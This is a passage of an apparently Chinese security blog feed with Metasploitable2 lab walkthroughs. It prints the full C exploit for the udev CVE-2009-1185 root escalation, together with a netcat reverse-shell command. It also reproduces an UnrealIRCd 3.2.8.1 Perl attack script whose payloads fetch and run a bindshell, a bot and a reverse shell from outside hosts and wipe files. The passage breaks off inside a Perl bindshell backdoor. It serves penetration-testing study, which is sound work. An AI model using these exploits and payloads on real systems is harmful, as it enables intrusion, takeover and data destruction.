class="hljs-string">HTTP request sent, awaiting response... 200 OK</span><br><span class="hljs-string">Length: 2,902 (2.8K) [text/x-csrc]</span><br><span class="hljs-string"></span><br><span class="hljs-string">100%[=======================================================================&gt;] 2,902         --.--K/s             </span><br><span class="hljs-string"></span><br><span class="hljs-string">22:00:56 (566.80 KB/s) - `test.c&#x27;</span> saved [2902/2902]<br><br>msfadmin@metasploitable:~$ <span class="hljs-built_in">ls</span><br>test.cvulnerable<br>msfadmin@metasploitable:~$ gcc -o exploit test.c     <br></code></pre></td></tr></table></figure><p>然后切换回kali，使用nc监听：</p><p>nc -lvp 4444（端口号随意，只需要和下面的端口号一样即可）</p><p>然后在靶机telnet进行下面操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfadmin@metasploitable:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/sh&#x27;</span> &gt; /tmp/run<br>msfadmin@metasploitable:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/netcat -e /bin/sh 192.168.52.134 4444&#x27;</span> &gt;&gt; /tmp/run<br>msfadmin@metasploitable:~$ ps aux | grep udev<br>root      2719  0.0  0.1   2092   620 ?        S&lt;s  07:31   0:00 /sbin/udevd --daemon<br>msfadmin  7331  0.0  0.1   3008   772 pts/2    R+   22:05   0:00 grep udev<br><span class="hljs-comment">#执行exploit 具有root权限的pid减1</span><br>msfadmin@metasploitable:~$ ./exploit 2718<br><br></code></pre></td></tr></table></figure><p>运行完之后，监听端口反弹shell，拿到root权限：</p><p><img src="/%5Cimages%5Ctelnet3.png"></p><p>然后可以使用 python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’ 获取伪终端方便使用</p><h3 id="为什么可以提权"><a href="#为什么可以提权" class="headerlink" title="为什么可以提权"></a>为什么可以提权</h3><p>提权代码利用的是cve-2009-1185  init未检查NETLINK消息来源,本地提权漏洞。</p><p>udev是Linuxkernel系列的设备管理器，主要功能是管理&#x2F;dev目录下的设备节点。udev没有正确地检查Netlink消息的来源，本地攻击者可以利用这个漏洞从用户空间进程而不是内核向udev发送特制的Netlink消息，导致其创建已有系统块设备(如root文件系统)完全可写的块设备文件，以获得root用户权限。</p><p><strong>exp代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * cve-2009-1185.c</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * udev &lt; 141 Local Privilege Escalation Exploit</span><br><span class="hljs-comment"> * Jon Oberheide &lt;jon@oberheide.org&gt;</span><br><span class="hljs-comment"> * http://jon.oberheide.org</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Information:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1185</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   udev before 1.4.1 does not verify whether a NETLINK message originates </span><br><span class="hljs-comment"> *   from kernel space, which allows local users to gain privileges by sending </span><br><span class="hljs-comment"> *   a NETLINK message from user space.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Notes:</span><br><span class="hljs-comment"> *   </span><br><span class="hljs-comment"> *   An alternate version of kcope&#x27;s exploit.  This exploit leverages the </span><br><span class="hljs-comment"> *   95-udev-late.rules functionality that is meant to run arbitrary commands </span><br><span class="hljs-comment"> *   when a device is removed.  A bit cleaner and reliable as long as your </span><br><span class="hljs-comment"> *   distro ships that rule file.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   Tested on Gentoo, Intrepid, and Jaunty.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Usage:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, </span><br><span class="hljs-comment"> *   usually is the udevd PID minus 1) as argv[1].</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The exploit will execute /tmp/run as root so throw whatever payload you </span><br><span class="hljs-comment"> *   want in there.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/netlink.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NETLINK_KOBJECT_UEVENT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NETLINK_KOBJECT_UEVENT 15</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-type">int</span> sock;<br><span class="hljs-type">char</span> *mp, *err;<br><span class="hljs-type">char</span> message[<span class="hljs-number">4096</span>];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iovector</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_nl</span> <span class="hljs-title">address</span>;</span><br><br><span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>err = <span class="hljs-string">&quot;Pass the udevd netlink PID as an argument&quot;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] Error: %s\n&quot;</span>, err);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ((stat(<span class="hljs-string">&quot;/etc/udev/rules.d/95-udev-late.rules&quot;</span>, &amp;st) == <span class="hljs-number">-1</span>) &amp;&amp;<br>    (stat(<span class="hljs-string">&quot;/lib/udev/rules.d/95-udev-late.rules&quot;</span>, &amp;st) == <span class="hljs-number">-1</span>)) &#123;<br>err = <span class="hljs-string">&quot;Required 95-udev-late.rules not found&quot;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] Error: %s\n&quot;</span>, err);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (stat(<span class="hljs-string">&quot;/tmp/run&quot;</span>, &amp;st) == <span class="hljs-number">-1</span>) &#123;<br>err = <span class="hljs-string">&quot;/tmp/run does not exist, please create it&quot;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] Error: %s\n&quot;</span>, err);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>system(<span class="hljs-string">&quot;chmod +x /tmp/run&quot;</span>);<br><br><span class="hljs-built_in">memset</span>(&amp;address, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(address));<br>address.nl_family = AF_NETLINK;<br>address.nl_pid = atoi(argv[<span class="hljs-number">1</span>]);<br>address.nl_groups = <span class="hljs-number">0</span>;<br><br>msg.msg_name = (<span class="hljs-type">void</span>*)&amp;address;<br>msg.msg_namelen = <span class="hljs-keyword">sizeof</span>(address);<br>msg.msg_iov = &amp;iovector;<br>msg.msg_iovlen = <span class="hljs-number">1</span>;<br><br>sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);<br>bind(sock, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;address, <span class="hljs-keyword">sizeof</span>(address));<br><br>mp = message;<br>mp += <span class="hljs-built_in">sprintf</span>(mp, <span class="hljs-string">&quot;remove@/d&quot;</span>) + <span class="hljs-number">1</span>;<br>mp += <span class="hljs-built_in">sprintf</span>(mp, <span class="hljs-string">&quot;SUBSYSTEM=block&quot;</span>) + <span class="hljs-number">1</span>;<br>mp += <span class="hljs-built_in">sprintf</span>(mp, <span class="hljs-string">&quot;DEVPATH=/dev/foo&quot;</span>) + <span class="hljs-number">1</span>;<br>mp += <span class="hljs-built_in">sprintf</span>(mp, <span class="hljs-string">&quot;TIMEOUT=10&quot;</span>) + <span class="hljs-number">1</span>;<br>mp += <span class="hljs-built_in">sprintf</span>(mp, <span class="hljs-string">&quot;ACTION=remove&quot;</span>) +<span class="hljs-number">1</span>;<br>mp += <span class="hljs-built_in">sprintf</span>(mp, <span class="hljs-string">&quot;REMOVE_CMD=/tmp/run&quot;</span>) +<span class="hljs-number">1</span>;<br><br>iovector.iov_base = (<span class="hljs-type">void</span>*)message;<br>iovector.iov_len = (<span class="hljs-type">int</span>)(mp-message);<br><br>sendmsg(sock, &amp;msg, <span class="hljs-number">0</span>);<br><br>close(sock);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>Netlink 是一种在内核与用户应用间进行双向数据传输的非常好的方式，用户态应用使用标准的 socket API 就可以使用 netlink 提供的强大功能。使用netlink 进行应用与内核通信的应用很多，包括：路由 daemon（NETLINK_ROUTE），1-wire 子系统（NETLINK_W1），用户态 socket 协议（NETLINK_USERSOCK），防火墙（NETLINK_FIREWALL），socket 监视（NETLINK_INET_DIAG），netfilter 日志（NETLINK_NFLOG），ipsec 安全策略（NETLINK_XFRM），SELinux 事件通知（NETLINK_SELINUX），iSCSI 子系统（NETLINK_ISCSI），进程审计（NETLINK_AUDIT），转发信息表查询 （NETLINK_FIB_LOOKUP），netlink connector(NETLINK_CONNECTOR),netfilter 子系统（NETLINK_NETFILTER），IPv6 防火墙（NETLINK_IP6_FW），DECnet 路由信息（NETLINK_DNRTMSG），内核事件向用户态通知（NETLINK_KOBJECT_UEVENT），通用 netlink（NETLINK_GENERIC）。</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
      <tag>Metasploitable2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Metasploitable2系列练习-漏洞利用之UnrealIRCd</title>
    <link href="/blog/2020/04/28/Metasploitable2%E7%B3%BB%E5%88%97%E7%BB%83%E4%B9%A0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BUnrealIRCd/"/>
    <url>/blog/2020/04/28/Metasploitable2%E7%B3%BB%E5%88%97%E7%BB%83%E4%B9%A0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BUnrealIRCd/</url>
    
    <content type="html"><![CDATA[<p><strong>上一篇学习了一下漏洞利用过程中的一些信息收集的准备工作，扫描了一下Metasploitable2的主机，发现好多开放的端口，从今天开始一个一个学习一下试一下能不能利用这些端口来进行一些渗透工作，一直学习就好了。</strong></p><p><img src="/%5Cimages%5Cfj44.jpg"></p><span id="more"></span><h2 id="什么是UnrealIRCd"><a href="#什么是UnrealIRCd" class="headerlink" title="什么是UnrealIRCd"></a>什么是UnrealIRCd</h2><p>UnrealIRCd是一款基于 C++ 的开源 IRCD 服务端应用</p><p>IRC 一种基于网络的群体聊天方式。可以进行群体聊天也可以进行个人对个人的单独聊天。这种起源于上世纪的聊天技术在当时被很多网友追捧。可惜经过网络信息交流方式日新月异的变化，逐渐被各类聊天软件所淘汰。<br>IRC具有分布式的客户端&#x2F;服务器结构。用户通过IRC软件连接并登录到到一个IRC服务器，可以访问这个服务器以及它所连接的其他服务器上的频道。 选择相应的聊天频道，既可以开始广播式的群里聊天。也可对频道中单独的用户发起聊天。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><p>扫描结果如下：</p><p><img src="/%5Cimages%5Cmetasploitable2-0.png"></p><p>可以看到，有两个关于 Unreal IRCd 的开放端口，分别为 6667 和 6697 </p><h3 id="使用hexchat-IRC客户端连接IRC-Server"><a href="#使用hexchat-IRC客户端连接IRC-Server" class="headerlink" title="使用hexchat IRC客户端连接IRC Server"></a>使用hexchat IRC客户端连接IRC Server</h3><p>安装客户端：sudo apt install -y hexchat</p><p>太慢的话建议更换kali 源，编辑 &#x2F;etc&#x2F;apt&#x2F;sources.list，注释掉原本的国外源，改用清华或者阿里的源：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#阿里云</span><br>deb http:<span class="hljs-comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br>deb-src http:<span class="hljs-comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><br><span class="hljs-meta">#清华大学</span><br>deb http:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br>deb-src https:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></code></pre></td></tr></table></figure><p>安装完成后开启hexchat，添加一个 Metasploitable 2这个服务器：</p><p><img src="/%5Cimages%5Cmetasploitable2-1.png"></p><p>关闭窗口之后点击连接按钮，我们就成功连接到了服务器：</p><p><img src="/%5Cimages%5Cmetasploitable2-2.png"></p><p>在这里我们可以看到version Unreal3.2.8.1，下面我们可以去searchsploit 和 exploit-db 里进行查询评估，看看这个版本的 Unreal IRC 是否存在可被利用的漏洞</p><h3 id="Unreal-IRCd-3-2-8-1-漏洞评估"><a href="#Unreal-IRCd-3-2-8-1-漏洞评估" class="headerlink" title="Unreal IRCd 3.2.8.1 漏洞评估"></a>Unreal IRCd 3.2.8.1 漏洞评估</h3><h4 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h4><p>kali里面使用如下命令：searchsploit unreal ircd 3.2.8.1</p><p><img src="/%5Cimages%5Cmetasploitable2-3.png"></p><p>可以看出该版本有三个可利用漏洞：</p><ul><li>后门漏洞可在 Metasploit 上利用的 Ruby exploit</li><li>本地溢出可造成DOS拒绝服务的 exploit ，但它只适用于 windows ，因此不适用我们的目标 Metasploitable 2 </li><li>远程下载和执行 Perl 脚本木马</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="手动分析利用"><a href="#手动分析利用" class="headerlink" title="手动分析利用"></a>手动分析利用</h3><p>查看payloads脚本内容：</p><p>cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;remote&#x2F;13853.pl</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl</span><br><span class="hljs-comment"># Unreal3.2.8.1 Remote Downloader/Execute Trojan</span><br><span class="hljs-comment"># DO NOT DISTRIBUTE -PRIVATE-</span><br><span class="hljs-comment"># -iHaq (2l8)</span><br><br><span class="hljs-keyword">use</span> Socket;<br><span class="hljs-keyword">use</span> IO::Socket;<br><br><span class="hljs-comment">## Payload options</span><br><span class="hljs-keyword">my</span> $payload1 = <span class="hljs-string">&#x27;AB; cd /tmp; wget http://packetstormsecurity.org/groups/synnergy/bindshell-unix -O bindshell; chmod +x bindshell; ./bindshell &amp;&#x27;</span>;<br><span class="hljs-keyword">my</span> $payload2 = <span class="hljs-string">&#x27;AB; cd /tmp; wget http://efnetbs.webs.com/bot.txt -O bot; chmod +x bot; ./bot &amp;&#x27;</span>;<br><span class="hljs-keyword">my</span> $payload3 = <span class="hljs-string">&#x27;AB; cd /tmp; wget http://efnetbs.webs.com/r.txt -O rshell; chmod +x rshell; ./rshell &amp;&#x27;</span>;<br><span class="hljs-keyword">my</span> $payload4 = <span class="hljs-string">&#x27;AB; killall ircd&#x27;</span>;<br><span class="hljs-keyword">my</span> $payload5 = <span class="hljs-string">&#x27;AB; cd ~; /bin/rm -fr ~/*;/bin/rm -fr *&#x27;</span>;<br><span class="hljs-comment">##Payload 1：使用 wget 下载和绑定一个 shell，并保存文件为 bindshell，赋予其执行权限，并进行执行。</span><br><span class="hljs-comment">##Payload 2：下载一个名为 bot 的文件，我们只能猜测它的选项到底是什么。</span><br><span class="hljs-comment">##Payload 3：下载一个文件，并保存为 rshell 。设置正确的权限，并执行文件。我们只能猜测，下载的有效载荷是一个反向的 shell 。</span><br><span class="hljs-comment">##Payload 4：停止 Unreal IRCD 服务。</span><br><span class="hljs-comment">##Payload 5：从服务器上删除 Unreal IRCD 服务。</span><br><br><span class="hljs-comment">##继续进行下一个代码块的分析，它是进行参数的检索及验证的，并打印其使用的相关信息在控制台上。</span><br><br>$host = <span class="hljs-string">&quot;&quot;</span>;<br>$port = <span class="hljs-string">&quot;&quot;</span>;<br>$type = <span class="hljs-string">&quot;&quot;</span>;<br>$host = @ARGV[<span class="hljs-number">0</span>];<br>$port = @ARGV[<span class="hljs-number">1</span>];<br>$type = @ARGV[<span class="hljs-number">2</span>];<br><br><span class="hljs-keyword">if</span> ($host eq <span class="hljs-string">&quot;&quot;</span>) &#123; usage(); &#125;<br><span class="hljs-keyword">if</span> ($port eq <span class="hljs-string">&quot;&quot;</span>) &#123; usage(); &#125;<br><span class="hljs-keyword">if</span> ($type eq <span class="hljs-string">&quot;&quot;</span>) &#123; usage(); &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">usage</span> </span>&#123;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;\nUsage :\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;perl unrealpwn.pl &lt;host&gt; &lt;port&gt; &lt;type&gt;\n\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;Command list :\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;[1] - Perl Bindshell\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;[2] - Perl Reverse Shell\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;[3] - Perl Bot\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;-----------------------------\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;[4] - shutdown ircserver\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;[5] - delete ircserver\n&quot;</span>;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">##头 3 行设置了三个初始化为空的变量，分别为 host, port 和 type  ，接着它们被分别赋予了变量值。下面开始判断这 3 个变量是否为空值，如果为空则执行 usage 函数。这将会退出脚本的执行，因为最后一行代码为 exit(1)，即程序发生错误则退出执行。在使用说明中，我们可以看到，有 5 种不同的类型的 payload 可以用来利用这个漏洞。并且分别做了相应的号码排序。当我们仔细查看以上脚本内容，我们可以发现，类型 2 的 payload 和类型 3 的 payload 进行了切换</span><br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">unreal_trojan</span> </span>&#123;<br>  <span class="hljs-keyword">my</span> $ircserv = $host;<br>  <span class="hljs-keyword">my</span> $ircport = $port;<br>  <span class="hljs-keyword">my</span> $sockd = IO::Socket::INET-&gt;new (<span class="hljs-string">PeerAddr =&gt;</span> $ircserv, <span class="hljs-string">PeerPort =&gt;</span> $ircport, <span class="hljs-string">Proto =&gt;</span> <span class="hljs-string">&quot;tcp&quot;</span>) || <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Failed to connect to $ircserv on $ircport ...\n\n&quot;</span>;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;[+] Payload sent ...\n&quot;</span>;<br>  <span class="hljs-keyword">if</span> ($type eq <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> $sockd <span class="hljs-string">&quot;$payload1&quot;</span>;<br>  &#125; <span class="hljs-keyword">elsif</span> ($type eq <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> $sockd <span class="hljs-string">&quot;$payload2&quot;</span>;<br>  &#125; <span class="hljs-keyword">elsif</span> ($type eq <span class="hljs-string">&quot;3&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> $sockd <span class="hljs-string">&quot;$payload3&quot;</span>;<br>  &#125; <span class="hljs-keyword">elsif</span> ($type eq <span class="hljs-string">&quot;4&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> $sockd <span class="hljs-string">&quot;$payload4&quot;</span>;<br>  &#125; <span class="hljs-keyword">elsif</span> ($type eq <span class="hljs-string">&quot;5&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> $sockd <span class="hljs-string">&quot;$payload5&quot;</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;\nInvalid Option ...\n\n&quot;</span>;<br>    usage();<br>  &#125;<br>  <span class="hljs-keyword">close</span>($sockd);<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">##在这个代码块中对应的 payload 分别进行执行，类型 1 执行 payload 1, 类型 2 执行 payload 2 等</span><br>unreal_trojan();<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl </span><br><span class="hljs-comment"># *** Synnergy Networks </span><br><span class="hljs-comment"># * Description: </span><br><span class="hljs-comment"># # Remote unix shell backdoor. </span><br><span class="hljs-comment"># * Author: # # headflux (hf@synnergy.net) # Synnergy Networks (c) 1999, http://www.synnergy.net </span><br><span class="hljs-comment"># * Usage: </span><br><span class="hljs-comment"># remote.com$ ./nohup bindshell.pl &amp; </span><br><span class="hljs-comment"># remote.com$ exit </span><br><span class="hljs-comment"># Connection closed by foreign host </span><br><span class="hljs-comment"># localhost$ telnet remote.com 60000 </span><br><span class="hljs-comment"># Trying 192.168.1.1... </span><br><span class="hljs-comment"># Connected to remote.com. </span><br><span class="hljs-comment"># Escape character is &#x27;^]&#x27;. </span><br><span class="hljs-comment"># (user@remote.com:/home/user/) </span><br><span class="hljs-comment"># cat /etc/passwd; etc </span><br><span class="hljs-comment"># *** Synnergy Networks use Socket; </span><br>$port = <span class="hljs-number">60000</span>; $proto = <span class="hljs-keyword">getprotobyname</span>(<span class="hljs-string">&#x27;tcp&#x27;</span>); $cmd = <span class="hljs-string">&quot;lpd&quot;</span>; $system = <span class="hljs-string">&#x27;echo &quot;(`whoami`@`uname -n`:`pwd`)&quot;; /bin/sh&#x27;</span>; $0 = $cmd; <span class="hljs-keyword">socket</span>(SERVER, PF_INET, SOCK_STREAM, $proto) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;socket:$!&quot;</span>; <span class="hljs-keyword">setsockopt</span>(SERVER, SOL_SOCKET, SO_REUSEADDR, <span class="hljs-keyword">pack</span>(<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-number">1</span>)) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;setsockopt: $!&quot;</span>; <span class="hljs-keyword">bind</span>(SERVER, sockaddr_in($port, INADDR_ANY)) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;bind: $!&quot;</span>; <span class="hljs-keyword">listen</span>(SERVER, SOMAXCONN) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;listen: $!&quot;</span>; <span class="hljs-keyword">for</span>(; $paddr = <span class="hljs-keyword">accept</span>(CLIENT, SERVER); <span class="hljs-keyword">close</span> CLIENT) &#123; <span class="hljs-keyword">open</span>(STDIN, <span class="hljs-string">&quot;&gt;&amp;CLIENT&quot;</span>); <span class="hljs-keyword">open</span>(STDOUT, <span class="hljs-string">&quot;&gt;&amp;CLIENT&quot;</span>); <span class="hljs-keyword">open</span>(STDERR, <span class="hljs-string">&quot;&gt;&amp;CLIENT&quot;</span>); <span 